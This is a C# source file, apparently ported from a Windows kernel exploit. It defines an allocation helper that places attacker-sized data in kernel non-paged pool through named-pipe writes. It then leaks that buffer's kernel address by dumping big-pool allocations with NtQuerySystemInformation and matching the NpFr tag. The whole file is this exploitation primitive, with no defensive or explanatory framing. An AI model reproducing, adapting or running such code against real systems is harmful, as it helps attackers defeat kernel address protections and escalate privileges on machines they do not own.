using System;
using System.Runtime.InteropServices;

namespace R0aCkS
{
    /// <summary>Tracks allocation state between calls</summary>
    /// <remarks>KERNEL_ALLOC in original code.</remarks>
    internal struct AllocationTracker : IDisposable
    {
        internal unsafe AllocationTracker(/*AllocationTracker KernelAlloc, */ uint size)
        {
            // Only support < 2KB allocations
            if (size > 2048) {
                throw new ArgumentOutOfRangeException("size");
            }
            // Compute a magic size to get something in big pool that should be unique
            // This will use at most ~5MB of non-paged pool
            this.MagicSize = 0;
            while (0 == this.MagicSize) {
                this.MagicSize = (uint)(((Helpers.Rdtsc() & 0xFF000000) >> 24) * 0x5000);
            }
            // Allocate the right child page that will be sent to the trampoline
            this._userBase = (void*)Natives.VirtualAlloc(UIntPtr.Zero, this.MagicSize,
                0x00003000 /* MEM_COMMIT | MEM_RESERVE*/, 4 /*PAGE_READWRITE*/);
            if (null == this._userBase) {
                Console.WriteLine("[-] Failed to allocate user-mode memory for kernel buffer");
                throw new ApplicationException();
            }
            // Allocate a pipe to hold on to the buffer
            if (!Natives.CreatePipe(out this.Pipe0, out this.Pipe1, UIntPtr.Zero, this.MagicSize)) {
                Console.WriteLine("[-] Failed creating the pipe: 0x{0:X16}", Marshal.GetLastWin32Error());
                throw new ApplicationException();
            }
            // Return the allocated user-mode base
            KernelBase = UIntPtr.Zero;
            return;
        }

        internal unsafe void* UserBase
        {
            get { return _userBase; }
        }

        // Was GetKernelAddress
        private unsafe UIntPtr CaptureKernelAddress()
        {
            // Allocate a large 32MB buffer to store pool tags in
            SYSTEM_BIGPOOL_INFORMATION* bigPoolInfo = (SYSTEM_BIGPOOL_INFORMATION*)Natives.VirtualAlloc(UIntPtr.Zero,
                POOL_TAG_FIXED_BUFFER, 0x00003000 /* MEM_COMMIT | MEM_RESERVE*/, 4 /*PAGE_READWRITE*/);
            if (null == bigPoolInfo) {
                Console.WriteLine("[-] No memory for pool buffer");
                return UIntPtr.Zero;
            }
            // Dump all pool tags
            uint resultLength;
            uint status = Natives.NtQuerySystemInformation(66 /* SystemBigPoolInformation*/, (UIntPtr)bigPoolInfo,
                POOL_TAG_FIXED_BUFFER, out resultLength);
            if (0 != status) {
                Console.WriteLine("[-] Failed to dump pool allocations: 0x{0:X}", status);
                return UIntPtr.Zero;
            }
            // Scroll through them all
            UIntPtr resultAddress;
            uint index;
            for (resultAddress = UIntPtr.Zero, index = 0; index < bigPoolInfo->Count; index++) {
                // Check for the desired allocation
                SYSTEM_BIGPOOL_ENTRY* entry = &bigPoolInfo->AllocatedInfo + index;
                if (entry->TagUlong == NPFS_DATA_ENTRY_POOL_TAG) {
                    // With the Heap-Backed Pool in RS5/19H1, sizes are precise, while
                    // the large pool allocator uses page-aligned pages
                    if ((entry->SizeInBytes == (this.MagicSize + PAGE_SIZE)) ||
                        (entry->SizeInBytes == (this.MagicSize + NPFS_DATA_ENTRY_SIZE)))
                    {
                        // Mask out the nonpaged pool bit
                        resultAddress = (UIntPtr)((ulong)entry->VirtualAddress & (ulong.MaxValue - 1)); // ~1;
                        break;
                    }
                }
            }
            // Weird..
            if (UIntPtr.Zero == resultAddress) {
                Console.WriteLine("[-] Kernel buffer not found!");
                return UIntPtr.Zero;
            }
            // Free the buffer
            Natives.VirtualFree((UIntPtr)bigPoolInfo, 0, 0x8000 /*MEM_RELEASE*/);
            return (resultAddress + (int)NPFS_DATA_ENTRY_SIZE);
        }

        // Was KernelFree
        public unsafe void Dispose()
        {
            // Free the UM side of the allocation
            if (null != _userBase) {
                Natives.VirtualFree((UIntPtr)(this._userBase), 0, 0x8000 /*MEM_RELEASE*/);
            }
            // Close the pipes, which will free the kernel side
            Natives.CloseHandle(this.Pipe0);
            Natives.CloseHandle(this.Pipe1);
        }

        // Was KernelWrite
        internal unsafe UIntPtr Write()
        {
            // Write into the buffer
            uint bytesWriten;
            if (!Natives.WriteFile(this.Pipe1, (UIntPtr)this.UserBase, this.MagicSize, out bytesWriten, UIntPtr.Zero))
            {
                Console.WriteLine("[-] Failed writing kernel buffer: 0x{0:X}", Marshal.GetLastWin32Error());
                return UIntPtr.Zero;
            }
            // Compute the kernel address and return it
            return (this.KernelBase = CaptureKernelAddress());
        }

        internal const uint NPFS_DATA_ENTRY_POOL_TAG = 0x4E704672; // 'rFpN'
        internal const uint NPFS_DATA_ENTRY_SIZE = 0x30;
        internal const uint PAGE_SIZE = 4096;
        private const uint POOL_TAG_FIXED_BUFFER = (32 * 1024 * 1024);

        internal IntPtr Pipe0;
        internal IntPtr Pipe1;
        private unsafe void* _userBase;
        internal UIntPtr KernelBase;
        internal uint MagicSize;

        [StructLayout(LayoutKind.Explicit)]
        private struct SYSTEM_BIGPOOL_ENTRY
        {
            [FieldOffset(0)]
            internal UIntPtr VirtualAddress;
            [FieldOffset(0)]
            internal ulong NonPaged; // :1
            [FieldOffset(8)]
            internal ulong SizeInBytes;
            [FieldOffset(16)]
            internal byte Tag0;
            [FieldOffset(17)]
            internal byte Tag1;
            [FieldOffset(18)]
            internal byte Tag2;
            [FieldOffset(19)]
            internal byte Tag3;
            [FieldOffset(16)]
            internal uint TagUlong;
        }

        private struct SYSTEM_BIGPOOL_INFORMATION
        {
            internal uint Count;
            internal SYSTEM_BIGPOOL_ENTRY AllocatedInfo /* [ANYSIZE_ARRAY] */;
        }
    }
}
